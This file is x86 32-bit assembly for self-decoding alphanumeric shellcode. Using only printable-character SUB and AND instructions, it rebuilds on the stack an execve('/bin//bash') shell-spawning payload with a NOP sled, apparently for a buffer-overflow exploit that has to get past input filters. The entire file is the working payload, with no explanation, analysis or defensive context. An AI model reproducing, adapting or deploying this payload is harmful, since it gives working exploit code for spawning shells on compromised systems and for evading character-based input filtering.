BITS 32
push esp
pop eax ; eax = ebp

sub eax, 0x79797979
sub eax, 0x39393939
sub eax, 0x4d4d4e5a

push eax
pop esp ; esp = esp - 0x200 (buff stack frame) + 248
; 248 = 212 (constructor) + 36 (constructed)

and eax, 0x47474747
and eax, 0x38383838 ; eax = 0

sub eax, 0x2551512d
sub eax, 0x25705825
sub eax, 0x34707525
push eax ; 0x80cde189

sub eax, 0x6e323131
sub eax, 0x6e253031
sub eax, 0x51252d46
push eax ; 0x535152e1

sub eax, 0x35353535
sub eax, 0x3535355f
sub eax, 0x2d354b6c
sub eax, 0x32416f79
push eax ; 0x89702d68

sub eax, 0x37376d37
sub eax, 0x786d6d37
sub eax, 0x73786f71
push eax ; 0x6652e389

sub eax, 0x7a7a257a
sub eax, 0x4539257a
sub eax, 0x38363666
push eax ; 0x6e69622f

sub eax, 0x72727272
sub eax, 0x52524c36
sub eax, 0x41314225
push eax ; 0x68736162

sub eax, 0x66333333
sub eax, 0x66666666
sub eax, 0x6c715f5f
push eax ; 0x2f68686a

sub eax, 0x39393978
sub eax, 0x39256678
sub eax, 0x6a70706f
push eax ; 0x5299580b

sub eax, 0x31313131
sub eax, 0x6b6b3125
sub eax, 0x4b6c6525
push eax ; 0x6a909090

sub eax, 0x74747474
sub eax, 0x345a5a5a
sub eax, 0x31313132
push eax ; 0x90909090
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
